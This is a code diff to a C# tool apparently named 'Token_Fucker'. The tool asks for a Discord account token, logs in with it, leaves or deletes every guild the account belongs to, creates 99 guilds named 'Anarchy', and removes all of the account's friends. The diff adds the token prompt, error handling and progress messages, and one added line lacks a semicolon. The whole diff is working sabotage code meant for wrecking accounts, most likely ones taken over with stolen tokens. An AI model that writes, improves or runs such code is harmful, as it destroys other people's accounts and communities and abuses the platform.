@@ -13,10 +13,18 @@ namespace Token_Fucker
     {
         static void Main(string[] args)
         {
+            Console.WriteLine("Enter a token to be fucked.");
+            string token = Console.ReadLine();
             DiscordSocketClient client = new DiscordSocketClient(new DiscordSocketConfig() { ApiVersion = 7 });
             client.OnLoggedIn += Client_OnLoggedIn;
             #region Token
-            client.Login("token here");
+            try
+            {
+                client.Login(token);
+            } catch (Discord.InvalidTokenException)
+            {
+                Console.WriteLine("Invalid token passed.");
+            }
             #endregion
             Thread.Sleep(-1);
         }
@@ -33,7 +41,7 @@ namespace Token_Fucker
                     client.LeaveGuild(guildids.Id);
                     Console.WriteLine("Left Guild " + guildids.Id);
                 }
-                catch (Exception ex)
+                catch
                 {
                     client.DeleteGuild(guildids.Id);
                     Console.WriteLine("Deleted Guild " + guildids.Id);
@@ -44,6 +52,7 @@ namespace Token_Fucker
             for (int amount = 1; amount < 100; amount++)
             {
                 client.CreateGuild("Anarchy", null, "europe");
+                Console.WriteLine("Created a guild.");
             }
 
             // Remove all friends.
@@ -53,6 +62,8 @@ namespace Token_Fucker
                 client.RemoveRelationship(friendids.User.Id);
                 Console.WriteLine("Removed relationship with ID " + friendids.User.Id);
             }
+
+            Console.WriteLine("\n\nFinished fucking the account.")
         }
     }
 }
